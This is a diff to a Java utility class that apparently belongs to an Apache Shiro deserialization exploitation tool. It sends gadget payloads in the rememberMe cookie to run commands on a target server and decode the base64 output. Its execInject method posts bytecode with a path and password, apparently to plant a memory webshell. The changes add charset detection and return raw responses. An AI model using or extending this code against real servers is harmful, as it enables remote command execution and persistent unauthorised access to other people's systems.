@@ -15,7 +15,9 @@ import vulgui.deser.util.Gadgetsplugin;
 import vulgui.utils.HttpUtil;
 
 import javax.xml.bind.DatatypeConverter;
+import java.io.UnsupportedEncodingException;
 import java.net.HttpURLConnection;
+import java.nio.charset.StandardCharsets;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
@@ -28,7 +30,7 @@ import java.util.Map;
  * @Version 1.0
  **/
 public class DserUtil {
-    private int timeout = 10000;
+    public static int timeout = 10000;
 
     public static Object principal = null;
     public static ObjectPayload<?> gadgetpayload = null;
@@ -69,6 +71,20 @@ public class DserUtil {
         return false;
     }
 
+    public static String guessEncoding(byte[] bytes) {
+        String DEFAULT_ENCODING = "UTF-8";
+        org.mozilla.universalchardet.UniversalDetector detector =
+                new org.mozilla.universalchardet.UniversalDetector(null);
+        detector.handleData(bytes, 0, bytes.length);
+        detector.dataEnd();
+        String encoding = detector.getDetectedCharset();
+        detector.reset();
+        if (encoding == null) {
+            encoding = DEFAULT_ENCODING;
+        }
+        return encoding;
+    }
+
     public static String exec(String targeturl, String sendpayload, String command, int timeout) {
         Map<String, String> headers = new HashMap<String, String>();
         headers.put("Cookie", sendpayload);
@@ -86,16 +102,26 @@ public class DserUtil {
 
         String result;
         try {
-            result = responseText.substring(responseText.indexOf("$$$") + 1, responseText.lastIndexOf("$$$"));
+            result = responseText.split("\\$\\$\\$")[1];
         } catch (Exception e) {
             return null;
         }
 
+
         if (result.length() != 0) {
-            return new String(DatatypeConverter.parseBase64Binary(result));
+
+            byte[] b64bytes = org.apache.shiro.codec.Base64.decode(result);
+            String defaultEncode = guessEncoding(b64bytes);
+
+            try {
+                return new String(b64bytes, defaultEncode);
+            } catch (UnsupportedEncodingException e) {
+                return new String(b64bytes);
+            }
         } else {
             return null;
         }
+
     }
 
 
@@ -118,7 +144,7 @@ public class DserUtil {
         return true;
     }
 
-    public static boolean execInject(String targeturl, String rememberMe, String b64Bytecode, String injectPath, String injectPass, int timeout) {
+    public static String execInject(String targeturl, String rememberMe, String b64Bytecode, String injectPath, String injectPass, int timeout) {
         Map<String, String> headers = new HashMap<String, String>();
         headers.put("Cookie", rememberMe);
 
@@ -133,18 +159,7 @@ public class DserUtil {
         }
 
         HttpURLConnection conn = HttpUtil.post(targeturl, params, headers, timeout, timeout, "utf-8");
-
-        String responseText = HttpUtil.getBody(conn, "utf-8");
-
-        try {
-            assert responseText != null;
-            if (responseText.contains("dynamic inject success")) {
-                return true;
-            }
-        } catch (Exception e) {
-            return false;
-        }
-
-        return false;
+        String result = HttpUtil.getBody(conn, "utf-8");
+        return result;
     }
 }
